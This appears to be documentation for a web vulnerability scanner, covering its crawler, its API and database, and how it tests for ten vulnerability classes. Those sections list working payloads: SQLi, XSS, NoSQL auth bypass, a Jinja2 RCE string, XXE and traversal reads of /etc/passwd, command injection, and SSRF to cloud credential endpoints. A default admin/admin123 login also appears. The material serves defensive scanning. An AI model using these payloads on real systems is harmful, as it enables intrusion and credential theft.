# Web Vulnerability Scanner - Complete Documentation

## Table of Contents
1. [Overview](#overview)
2. [Architecture](#architecture)
3. [How Crawling Works](#how-crawling-works)
4. [How Payload Testing Works](#how-payload-testing-works)
5. [Vulnerability Types](#vulnerability-types)
6. [Confidence Scoring & False Positive Prevention](#confidence-scoring--false-positive-prevention)
7. [Report Generation](#report-generation)
8. [API Reference](#api-reference)
9. [Database Schema](#database-schema)
10. [Configuration](#configuration)

---

## Overview

This is a **full-stack web vulnerability scanner** designed for authorized security testing. It automatically:
1. Crawls target websites to discover pages, forms, and parameters
2. Tests discovered endpoints with security payloads
3. Analyzes responses to detect vulnerabilities
4. Generates professional reports

### Tech Stack
| Component | Technology |
|-----------|------------|
| Backend | Python 3.10+ / FastAPI |
| Frontend | React 18 / TypeScript / Vite |
| Browser Automation | Playwright (Chromium) |
| Database | SQLite |
| HTTP Client | Requests / aiohttp |
| Report Generation | Jinja2 / WeasyPrint |

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        Frontend (React)                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐        │
│  │  Login   │  │ Dashboard│  │ New Scan │  │ Reports  │        │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘        │
└─────────────────────────────┬───────────────────────────────────┘
                              │ HTTP/REST API
┌─────────────────────────────▼───────────────────────────────────┐
│                      Backend (FastAPI)                           │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐             │
│  │ Auth Router │  │ Scan Router │  │Report Router│             │
│  └─────────────┘  └─────────────┘  └─────────────┘             │
│                              │                                   │
│  ┌───────────────────────────▼──────────────────────────────┐   │
│  │                    Scanner Engine                         │   │
│  │  ┌──────────────┐  ┌──────────────┐  ┌────────────────┐  │   │
│  │  │   Crawler    │  │  Vuln Tester │  │ Payload Registry│  │   │
│  │  │ (Playwright) │  │  (Requests)  │  │   (67+ types)  │  │   │
│  │  └──────────────┘  └──────────────┘  └────────────────┘  │   │
│  └──────────────────────────────────────────────────────────┘   │
│                              │                                   │
│  ┌───────────────────────────▼──────────────────────────────┐   │
│  │              Task Queue & Worker System                   │   │
│  │  • Job scheduling    • Progress tracking                  │   │
│  │  • Retry logic       • Timeout watchdog                   │   │
│  └──────────────────────────────────────────────────────────┘   │
└─────────────────────────────┬───────────────────────────────────┘
                              │
┌─────────────────────────────▼───────────────────────────────────┐
│                      SQLite Database                             │
│  Users │ Sessions │ Scans │ Forms │ Vulnerabilities │ Reports   │
└─────────────────────────────────────────────────────────────────┘
```

### Key Files
```
app/
├── main.py                      # FastAPI entry point
├── scanner/
│   ├── engine.py                # ProductionCrawler class
│   ├── vulnerability_tester.py  # VulnerabilityTester class
│   ├── http_client.py           # HTTP request utilities
│   ├── extractor.py             # Form/link extraction
│   ├── scope.py                 # URL scope validation
│   ├── task_queue.py            # Job queue management
│   ├── worker.py                # Background worker
│   └── payloads/                # Vulnerability payloads
│       ├── xss.py
│       ├── sqli.py
│       ├── nosql.py
│       ├── ssti.py
│       ├── xxe.py
│       ├── command_injection.py
│       ├── ssrf.py
│       ├── traversal.py
│       ├── redirect.py
│       └── header_injection.py
├── reports/
│   ├── generator.py             # Report generation
│   └── templates/               # HTML templates
└── db/
    └── database.py              # SQLite models
```

---

## How Crawling Works

The crawler (`app/scanner/engine.py`) uses **Playwright** with Chromium to render JavaScript-heavy pages. Here's the detailed process:

### Phase 1: Initial Page Load
```python
# 1. Launch headless browser
browser = await playwright.chromium.launch(headless=True)
page = await browser.new_page()

# 2. Set up network interception to capture all requests
page.on("request", lambda req: captured_urls.add(req.url))

# 3. Navigate to target URL
await page.goto(target_url, wait_until="networkidle")
```

### Phase 2: Discovery Techniques

The crawler uses **10+ discovery techniques**:

#### 1. Network Interception
Captures all HTTP requests made by the page (XHR, fetch, images, scripts):
```python
def on_request(request):
    url = request.url
    if is_in_scope(url, target_domain):
        discovered_urls.add(url)
```

#### 2. Link Extraction
Parses all `<a href="">` tags:
```python
links = await page.query_selector_all("a[href]")
for link in links:
    href = await link.get_attribute("href")
    absolute_url = urljoin(base_url, href)
    if is_in_scope(absolute_url):
        discovered_urls.add(absolute_url)
```

#### 3. Form Discovery
Finds all forms and extracts their structure:
```python
forms = await page.query_selector_all("form")
for form in forms:
    action = await form.get_attribute("action") or current_url
    method = await form.get_attribute("method") or "GET"
    inputs = await form.query_selector_all("input, select, textarea")

    form_data = {
        "url": urljoin(base_url, action),
        "method": method.upper(),
        "fields": [extract_field_info(inp) for inp in inputs]
    }
```

#### 4. JavaScript URL Extraction
Searches JavaScript code for URL patterns:
```python
js_patterns = [
    r'["\']/(api|v1|v2)/[^"\']+["\']',      # API endpoints
    r'fetch\(["\']([^"\']+)["\']',           # fetch() calls
    r'axios\.(get|post)\(["\']([^"\']+)',    # axios calls
    r'href\s*=\s*["\']([^"\']+)["\']',       # href assignments
    r'window\.location\s*=\s*["\']([^"\']+)', # redirects
]
```

#### 5. Click Discovery
Clicks interactive elements to reveal hidden content:
```python
clickables = await page.query_selector_all(
    "button, [onclick], [role='button'], .btn, .tab, .accordion"
)
for element in clickables:
    await element.click()
    await page.wait_for_timeout(500)
    # Re-extract links after click
```

#### 6. Scroll Discovery
Triggers lazy-loaded content:
```python
for i in range(5):
    await page.evaluate("window.scrollBy(0, window.innerHeight)")
    await page.wait_for_timeout(500)
```

#### 7. SPA Route Discovery
Detects Single Page Application routes:
```python
# Check for React Router, Vue Router, Angular Router
spa_indicators = [
    "react-router", "vue-router", "@angular/router",
    "data-reactroot", "ng-app", "[data-v-"
]
```

#### 8. Sitemap/Robots.txt Parsing
```python
# Parse sitemap.xml
sitemap_urls = parse_sitemap(f"{base_url}/sitemap.xml")

# Parse robots.txt for Disallow paths (often interesting!)
robots = requests.get(f"{base_url}/robots.txt")
disallowed_paths = extract_disallow_paths(robots.text)
```

#### 9. Data Attribute Extraction
```python
elements = await page.query_selector_all("[data-url], [data-href], [data-action]")
for el in elements:
    url = await el.get_attribute("data-url")
    if url:
        discovered_urls.add(urljoin(base_url, url))
```

#### 10. Comment Extraction
Searches HTML comments for hidden URLs:
```python
html = await page.content()
comments = re.findall(r'<!--(.+?)-->', html, re.DOTALL)
for comment in comments:
    urls = re.findall(r'https?://[^\s<>"]+', comment)
```

### Phase 3: Scope Validation
Only URLs within the target domain are processed:
```python
def is_in_scope(url: str, target_domain: str) -> bool:
    parsed = urlparse(url)
    return parsed.netloc == target_domain or parsed.netloc.endswith(f".{target_domain}")
```

### Crawl Output
```python
@dataclass
class CrawlResult:
    pages_visited: int
    forms_found: List[Form]
    urls_discovered: List[str]
    api_endpoints: List[str]
    parameters: Dict[str, List[str]]  # URL -> params
```

---

## How Payload Testing Works

The vulnerability tester (`app/scanner/vulnerability_tester.py`) tests each discovered endpoint.

### Testing Flow

```
┌─────────────────┐
│ Discovered Form │
│ or Parameter    │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  Get Baseline   │  ← Normal request to establish baseline response
│    Response     │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  For each       │
│  vulnerability  │──────────────────────────────────┐
│  type...        │                                  │
└────────┬────────┘                                  │
         │                                           │
         ▼                                           │
┌─────────────────┐     ┌─────────────────┐         │
│ Inject Payload  │────▶│ Analyze Response│         │
│ into Parameter  │     │  for Indicators │         │
└─────────────────┘     └────────┬────────┘         │
                                 │                   │
                                 ▼                   │
                        ┌─────────────────┐         │
                        │ Confirmation    │         │
                        │ Tests (CTF-style)│         │
                        └────────┬────────┘         │
                                 │                   │
                                 ▼                   │
                        ┌─────────────────┐         │
                        │ Calculate       │         │
                        │ Confidence Score│         │
                        └────────┬────────┘         │
                                 │                   │
                                 ▼                   │
                        ┌─────────────────┐         │
                        │ Store Finding   │◀────────┘
                        │ if confidence   │
                        │ >= threshold    │
                        └─────────────────┘
```

### Payload Injection Methods

#### 1. URL Parameter Injection (GET)
```python
# Original: https://example.com/search?q=test
# Injected: https://example.com/search?q=' OR '1'='1

params = {"q": "' OR '1'='1"}
response = requests.get(url, params=params)
```

#### 2. Form Data Injection (POST)
```python
# Original form: {"username": "user", "password": "pass"}
# Injected: {"username": "admin'--", "password": "x"}

data = {"username": payload, "password": "x"}
response = requests.post(url, data=data)
```

#### 3. JSON Body Injection
```python
# For NoSQL injection
data = {"username": {"$ne": null}, "password": {"$ne": null}}
response = requests.post(url, json=data, headers={"Content-Type": "application/json"})
```

#### 4. Header Injection
```python
# For header injection testing
headers = {"X-Custom": "value\r\nX-Injected: malicious"}
response = requests.get(url, headers=headers)
```

#### 5. XML Body Injection
```python
# For XXE testing
xml_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
response = requests.post(url, data=xml_payload, headers={"Content-Type": "application/xml"})
```

---

## Vulnerability Types

### 1. SQL Injection (SQLi)

**What it is:** Injecting SQL code into database queries to bypass authentication, extract data, or modify the database.

**File:** `app/scanner/payloads/sqli.py`

#### Detection Techniques:

##### Error-Based SQLi
Triggers database errors that reveal SQL syntax:
```python
payloads = [
    "'",                      # Single quote
    "''",                     # Double single quote
    '"',                      # Double quote
    "' OR '1'='1",           # Boolean true
    "' OR '1'='1' --",       # With comment
    "1' ORDER BY 1--",       # Column enumeration
    "' UNION SELECT NULL--", # Union injection
]

# Detection: Look for database error messages
error_patterns = [
    r"You have an error in your SQL syntax",  # MySQL
    r"ORA-\d{5}",                              # Oracle
    r"Unclosed quotation mark",               # MSSQL
    r"pg_query\(\)",                          # PostgreSQL
    r"sqlite3\.OperationalError",             # SQLite
]
```

##### Boolean-Based Blind SQLi
Compares responses between true/false conditions:
```python
# True condition
true_payload = "' OR '1'='1' --"
true_response = requests.get(url, params={"id": true_payload})

# False condition
false_payload = "' OR '1'='2' --"
false_response = requests.get(url, params={"id": false_payload})

# If responses differ significantly (>100 bytes), likely SQLi
if abs(len(true_response.content) - len(false_response.content)) > 100:
    # Confirm with another true condition
    confirm_payload = "' OR '2'='2' --"
    confirm_response = requests.get(url, params={"id": confirm_payload})

    if len(confirm_response.content) ≈ len(true_response.content):
        # CONFIRMED: Boolean-based SQLi
```

##### Time-Based Blind SQLi
Measures response time delays:
```python
payloads = [
    "' OR SLEEP(5) --",                    # MySQL
    "'; WAITFOR DELAY '0:0:5' --",         # MSSQL
    "' OR pg_sleep(5) --",                 # PostgreSQL
]

start = time.time()
response = requests.get(url, params={"id": payload})
elapsed = time.time() - start

if elapsed >= 4.5:  # Expected 5 seconds
    # Confirm with different delay
    confirm_payload = "' OR SLEEP(7) --"
    start = time.time()
    requests.get(url, params={"id": confirm_payload})
    confirm_elapsed = time.time() - start

    if confirm_elapsed >= 6.5:
        # CONFIRMED: Time-based SQLi
```

**Confidence Scores:**
- Error-based: 0.95 (very specific errors)
- Boolean-based: 0.85 (requires confirmation)
- Time-based: 0.80 (network latency can affect)

---

### 2. Cross-Site Scripting (XSS)

**What it is:** Injecting JavaScript that executes in users' browsers to steal cookies, hijack sessions, or deface pages.

**File:** `app/scanner/payloads/xss.py`

#### Payload Types:

##### Basic Script Injection
```html
<script>alert(1)</script>
<script>alert(document.cookie)</script>
```

##### Event Handler Injection
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
```

##### Attribute Escape
```html
" onmouseover="alert(1)" x="
' onfocus='alert(1)' autofocus='
```

##### JavaScript Context
```javascript
'-alert(1)-'
";alert(1)//
</script><script>alert(1)</script>
```

#### Detection Process:
```python
# 1. Generate unique marker
marker = "xss" + random_string(8)  # e.g., "xssab12cd34"

# 2. Inject payload with marker
payload = f'<script>alert("{marker}")</script>'
response = requests.get(url, params={"name": payload})

# 3. Check if marker is reflected
if marker in response.text:
    # 4. Analyze context
    context = analyze_context(response.text, marker)

    # 5. Check if payload was encoded (safe)
    if is_html_encoded(response.text, payload):
        return None  # Not vulnerable, properly encoded

    # 6. Check context danger level
    if context["in_script_tag"]:
        confidence = 0.95
    elif context["in_event_handler"]:
        confidence = 0.90
    elif context["in_html_attribute"]:
        confidence = 0.85
    else:
        confidence = 0.70
```

#### Context Analysis:
```python
def analyze_context(html: str, marker: str) -> dict:
    pos = html.find(marker)
    surrounding = html[max(0, pos-500):pos+500]

    return {
        "in_script_tag": is_inside_script(surrounding, pos),
        "in_event_handler": has_event_handler(surrounding),
        "in_html_attribute": is_inside_attribute(surrounding),
        "in_html_comment": is_inside_comment(surrounding),
        "is_encoded": is_html_encoded(surrounding, marker),
    }
```

**Confidence Scores:**
- In `<script>` tag: 0.95
- In event handler attribute: 0.90
- In HTML tag (can add attributes): 0.85
- Reflected but context unclear: 0.70

---

### 3. NoSQL Injection

**What it is:** Exploiting NoSQL databases (MongoDB, CouchDB) by injecting operators or JavaScript.

**File:** `app/scanner/payloads/nosql.py`

#### Payload Types:

##### Operator Injection (MongoDB)
```json
{"$gt": ""}           // Greater than empty string (always true)
{"$ne": null}         // Not equal to null (always true)
{"$ne": ""}           // Not equal to empty
{"$regex": ".*"}      // Matches everything
{"$where": "1==1"}    // JavaScript always true
```

##### Array Syntax (URL/Form)
```
username[$ne]=1&password[$ne]=1
username[$gt]=&password[$gt]=
username[$regex]=.*&password[$regex]=.*
```

##### Authentication Bypass
```json
{
  "$or": [
    {"username": "admin"},
    {"username": {"$ne": ""}}
  ]
}
```

#### Detection:
```python
# Look for MongoDB-specific indicators
indicators = [
    "mongodb", "bson", "objectid", "mongoose",
    "$where", "$gt", "$ne", "$regex",
    "collection", "cursor"
]

# Or authentication bypass success
success_indicators = [
    "welcome", "dashboard", "logged in",
    '"_id"', '"username"', '"admin"'
]
```

**Confidence Score:** 0.85

---

### 4. Server-Side Template Injection (SSTI)

**What it is:** Injecting template syntax that gets executed on the server, potentially leading to remote code execution.

**File:** `app/scanner/payloads/ssti.py`

#### Payloads by Template Engine:

| Engine | Payload | Expected Output |
|--------|---------|-----------------|
| Jinja2 (Python) | `{{7*7}}` | `49` |
| Jinja2 | `{{7*'7'}}` | `7777777` |
| Twig (PHP) | `{{7*7}}` | `49` |
| FreeMarker (Java) | `${7*7}` | `49` |
| ERB (Ruby) | `<%= 7*7 %>` | `49` |
| Velocity (Java) | `#set($x=7*7)${x}` | `49` |
| Smarty (PHP) | `{math equation='7*7'}` | `49` |

#### Detection:
```python
# Inject math expression
payload = "{{7*7}}"
response = requests.get(url, params={"name": payload})

# Check if evaluated (49 appears, but not the payload itself)
if "49" in response.text and payload not in response.text:
    # SSTI confirmed - math was evaluated server-side
    confidence = 0.95
```

#### Why It's Dangerous:
```python
# Jinja2 RCE payload example (for context only)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Confidence Score:** 0.95 (math evaluation is very specific)

---

### 5. XML External Entity (XXE)

**What it is:** Exploiting XML parsers to read local files, perform SSRF, or cause denial of service.

**File:** `app/scanner/payloads/xxe.py`

#### Payload Types:

##### File Disclosure
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

##### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/admin">
]>
<foo>&xxe;</foo>
```

##### Parameter Entity
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<foo>test</foo>
```

#### Detection:
```python
# Send XML with entity reference
xml_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>'''

response = requests.post(url,
    data=xml_payload,
    headers={"Content-Type": "application/xml"}
)

# Check for file content
file_indicators = ["root:", "bin:", "daemon:", "[fonts]", "[extensions]"]
if any(ind in response.text for ind in file_indicators):
    # XXE confirmed - file content returned
```

**Confidence Score:** 0.95

---

### 6. Command Injection

**What it is:** Injecting OS commands that get executed on the server.

**File:** `app/scanner/payloads/command_injection.py`

#### Payload Types:

##### Unix Commands
```bash
; id                    # Semicolon separator
| id                    # Pipe
`id`                    # Backticks
$(id)                   # Command substitution
&& id                   # AND operator
|| id                   # OR operator
\nid                    # Newline
```

##### Windows Commands
```cmd
| dir                   # Pipe
& dir                   # AND
| whoami                # Current user
| type c:\windows\win.ini
```

##### Time-Based (Blind)
```bash
; sleep 5               # Unix
| timeout /t 5          # Windows
$(sleep 5)              # Substitution
```

#### Detection:
```python
# Output-based detection
payload = "; id"
response = requests.get(url, params={"cmd": payload})

indicators = ["uid=", "gid=", "groups="]  # Unix id command output
if any(ind in response.text for ind in indicators):
    # Command injection confirmed

# Time-based detection
payload = "; sleep 5"
start = time.time()
response = requests.get(url, params={"cmd": payload})
elapsed = time.time() - start

if elapsed >= 4.5:
    # Possible blind command injection
```

**Confidence Scores:**
- Output-based: 0.95
- Time-based: 0.80

---

### 7. Server-Side Request Forgery (SSRF)

**What it is:** Tricking the server into making requests to internal/external resources.

**File:** `app/scanner/payloads/ssrf.py`

#### Payload Types:

##### Localhost Access
```
http://127.0.0.1
http://localhost
http://[::1]                    # IPv6
http://0.0.0.0
```

##### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/           # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/ # GCP
http://169.254.169.254/metadata/instance           # Azure
```

##### Internal Network
```
http://10.0.0.1
http://172.16.0.1
http://192.168.0.1
```

##### Protocol Handlers
```
file:///etc/passwd
dict://127.0.0.1:6379/info      # Redis
gopher://127.0.0.1:6379/_INFO   # Gopher
```

##### Bypass Techniques
```
http://2130706433              # Decimal IP (127.0.0.1)
http://0x7f000001              # Hex IP
http://0177.0.0.1              # Octal IP
http://127.0.0.1.nip.io        # DNS rebinding
```

#### Detection:
```python
payload = "http://169.254.169.254/latest/meta-data/"
response = requests.get(url, params={"url": payload})

# Check for cloud metadata indicators
aws_indicators = ["ami-id", "instance-id", "security-credentials"]
if any(ind in response.text for ind in aws_indicators):
    # SSRF to AWS metadata confirmed
```

**Confidence Score:** 0.85-0.95 (depends on what's returned)

---

### 8. Path Traversal / Local File Inclusion (LFI)

**What it is:** Accessing files outside the intended directory by manipulating file paths.

**File:** `app/scanner/payloads/traversal.py`

#### Payload Types:

##### Basic Traversal
```
../../../etc/passwd
....//....//....//etc/passwd    # Filter bypass
..././..././etc/passwd          # Double dot bypass
```

##### Encoded Variants
```
..%2f..%2f..%2fetc%2fpasswd     # URL encoded
..%252f..%252fetc%252fpasswd   # Double URL encoded
%2e%2e%2f%2e%2e%2fetc/passwd   # Encoded dots
..%c0%af..%c0%afetc/passwd     # Unicode encoding
```

##### Null Byte (older systems)
```
../../../etc/passwd%00.jpg      # Null byte termination
../../../etc/passwd\0.jpg
```

##### Windows
```
..\..\..\windows\win.ini
..\..\..\..\boot.ini
C:\Windows\win.ini
```

#### Detection:
```python
payload = "../../../etc/passwd"
response = requests.get(url, params={"file": payload})

# Check for file content
unix_indicators = ["root:", "bin:", "daemon:", "nobody:"]
windows_indicators = ["[fonts]", "[extensions]", "[boot loader]"]

if any(ind in response.text for ind in unix_indicators + windows_indicators):
    # Path traversal confirmed
```

**Confidence Score:** 0.95

---

### 9. Open Redirect

**What it is:** Tricking the application into redirecting users to malicious external sites.

**File:** `app/scanner/payloads/redirect.py`

#### Payload Types:
```
//evil.com                      # Protocol-relative
https://evil.com                # Absolute URL
//evil.com/%2f..                # With path
/\evil.com                      # Backslash bypass
////evil.com                    # Multiple slashes
https:evil.com                  # Missing slashes
//evil%E3%80%82com              # Unicode dot
```

#### Detection:
```python
payload = "//evil.com"
response = requests.get(url, params={"redirect": payload}, allow_redirects=False)

if response.status_code in [301, 302, 303, 307, 308]:
    location = response.headers.get("Location", "")

    # Check if redirecting to external domain
    if "evil.com" in location:
        original_domain = urlparse(url).netloc
        redirect_domain = urlparse(location).netloc

        if redirect_domain != original_domain:
            # Open redirect confirmed
```

**Confidence Score:** 0.90

---

### 10. Header Injection (CRLF)

**What it is:** Injecting CRLF characters to add malicious headers or split HTTP responses.

**File:** `app/scanner/payloads/header_injection.py`

#### Payload Types:
```
test\r\nX-Injected: true        # Raw CRLF
test%0d%0aX-Injected: true      # URL encoded
test\r\nSet-Cookie: admin=1     # Cookie injection
test\r\n\r\n<html>...           # Response splitting
```

#### Detection:
```python
payload = "test\r\nX-Injected: true"
response = requests.get(url, params={"name": payload})

# Check if our header was injected
if "X-Injected" in response.headers:
    # Header injection confirmed
```

**Confidence Score:** 0.90

---

## Confidence Scoring & False Positive Prevention

### Confidence Score System

Each finding has a confidence score from 0.0 to 1.0:

| Score Range | Meaning |
|-------------|---------|
| 0.90 - 1.00 | Very high confidence, almost certainly vulnerable |
| 0.80 - 0.89 | High confidence, likely vulnerable |
| 0.70 - 0.79 | Medium confidence, possibly vulnerable |
| < 0.70 | Low confidence, filtered out by default |

### Factors That Increase Confidence

1. **Specific Error Messages**
   - Database-specific SQL errors (+0.95)
   - Template engine errors (+0.80)

2. **Multi-Stage Confirmation**
   - Boolean SQLi confirmed with 3 requests (+0.85)
   - XSS confirmed with payload variations (+0.05)

3. **Content Indicators**
   - File content (passwd, win.ini) in response (+0.95)
   - Math evaluation results (49 from 7*7) (+0.95)

4. **Context Analysis**
   - XSS in `<script>` tag (+0.95)
   - XSS in event handler (+0.90)

### False Positive Prevention

1. **Encoding Detection**
   ```python
   # If payload is HTML-encoded, it's safe
   if "&lt;script&gt;" in response.text:
       return None  # Not vulnerable
   ```

2. **Response Comparison**
   ```python
   # Require significant difference for boolean SQLi
   if abs(true_len - false_len) < 100:
       return None  # Likely not SQLi
   ```

3. **Baseline Comparison**
   ```python
   # Compare against normal response
   baseline = get_baseline_response(url)
   if response == baseline:
       return None  # No change, not vulnerable
   ```

4. **Pattern Specificity**
   - Only match database-specific error patterns
   - Avoid generic "error" matches

5. **Confirmation Tests**
   - SQLi: Test multiple true/false conditions
   - XSS: Test payload variations
   - Time-based: Test multiple delay values

---

## Report Generation

### Report Types

| Format | Use Case |
|--------|----------|
| HTML | Web viewing, sharing, printing |
| PDF | Formal reports, archival |

### Report Contents

1. **Executive Summary**
   - Total vulnerabilities by severity
   - Risk score (0-100)
   - Target URL and scan date

2. **Vulnerability Breakdown**
   - By type (SQLi, XSS, etc.)
   - By severity (Critical, High, Medium, Low)

3. **Detailed Findings**
   - Vulnerability type
   - Affected URL
   - Vulnerable parameter
   - Payload used
   - Evidence/proof
   - Confidence score

### Generation Process

```python
# 1. Fetch scan data
scan = get_scan_by_id(scan_id)
vulnerabilities = get_vulnerabilities_for_scan(scan_id)

# 2. Prepare template data
report_data = {
    "scan_id": scan_id,
    "target_url": scan["target_url"],
    "vulnerabilities": vulnerabilities,
    "stats": calculate_stats(vulnerabilities),
    "risk_score": calculate_risk_score(vulnerabilities),
}

# 3. Render HTML template
template = jinja_env.get_template("report_template.html")
html = template.render(**report_data)

# 4. Convert to PDF (optional)
if format == "pdf":
    from weasyprint import HTML
    HTML(string=html).write_pdf(output_path)
```

---

## API Reference

### Authentication

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/register` | POST | Register new user |
| `/login` | POST | Login, returns token |
| `/logout` | POST | Invalidate session |
| `/verify` | GET | Verify token validity |

### Scanning

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/scan/` | POST | Start new scan |
| `/scan/{job_id}` | GET | Get scan results |
| `/scan/{job_id}/progress` | GET | Get real-time progress |
| `/scan/{job_id}/logs` | GET | Get scan logs |
| `/scan/{job_id}/vulnerabilities` | GET | Get vulnerabilities |

### Reports

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/reports/` | GET | List all reports |
| `/reports/{id}` | GET | Get report details |
| `/reports/generate/{scan_id}` | POST | Generate report |
| `/reports/download/{id}` | GET | Download report file |
| `/reports/view/{id}` | GET | View HTML report |

---

## Database Schema

### Users
```sql
CREATE TABLE Users (
    user_id INTEGER PRIMARY KEY,
    username TEXT UNIQUE NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT DEFAULT 'user',
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
```

### Scans
```sql
CREATE TABLE Scans (
    scan_id INTEGER PRIMARY KEY,
    user_id INTEGER NOT NULL,
    target_url TEXT NOT NULL,
    status TEXT DEFAULT 'pending',
    start_time DATETIME,
    end_time DATETIME,
    findings_count INTEGER DEFAULT 0,
    FOREIGN KEY (user_id) REFERENCES Users(user_id)
);
```

### Vulnerabilities
```sql
CREATE TABLE Vulnerabilities (
    vuln_id INTEGER PRIMARY KEY,
    scan_id INTEGER NOT NULL,
    vuln_type TEXT NOT NULL,
    severity TEXT NOT NULL,
    url TEXT,
    parameter TEXT,
    payload_used TEXT,
    evidence TEXT,
    confidence REAL,
    confirmed BOOLEAN,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (scan_id) REFERENCES Scans(scan_id)
);
```

### Reports
```sql
CREATE TABLE Reports (
    report_id INTEGER PRIMARY KEY,
    user_id INTEGER NOT NULL,
    scan_id INTEGER UNIQUE NOT NULL,
    summary TEXT,
    total_vulns INTEGER,
    report_path TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (scan_id) REFERENCES Scans(scan_id)
);
```

---

## Configuration

### Scanner Settings

```python
VulnerabilityTester(
    min_confidence=0.7,        # Minimum confidence to report
    confirm_findings=True,      # Enable multi-stage confirmation
    timeout=15,                 # Request timeout (seconds)
    max_retries=3,              # Retry failed requests
    delay_between_requests=0.1, # Rate limiting

    # Enable/disable specific tests
    test_sqli=True,
    test_xss=True,
    test_path_traversal=True,
    test_open_redirect=True,
    test_header_injection=True,
    test_nosql=True,
    test_ssti=True,
    test_cmdi=True,
    test_ssrf=True,
    test_xxe=True,
)
```

### Crawler Settings

```python
ProductionCrawler(
    max_pages=100,              # Maximum pages to crawl
    max_depth=5,                # Maximum link depth
    timeout=30,                 # Page load timeout
    wait_for_idle=True,         # Wait for network idle
    click_discovery=True,       # Click buttons/tabs
    scroll_discovery=True,      # Scroll for lazy content
    js_extraction=True,         # Extract URLs from JS
)
```

---

## Quick Start

### 1. Install Dependencies
```bash
pip install fastapi uvicorn playwright requests beautifulsoup4 jinja2 weasyprint passlib bcrypt
playwright install chromium
```

### 2. Start Backend
```bash
cd app
uvicorn main:app --reload --port 8000
```

### 3. Start Frontend
```bash
cd web-scanner-ui
npm install
npm run dev
```

### 4. Access Application
- Frontend: http://localhost:5173
- API Docs: http://localhost:8000/docs
- Default login: admin / admin123

---

## Legal Disclaimer

This tool is intended for **authorized security testing only**. Always obtain written permission before scanning any system you do not own. Unauthorized scanning may be illegal in your jurisdiction.

The authors are not responsible for misuse of this tool.
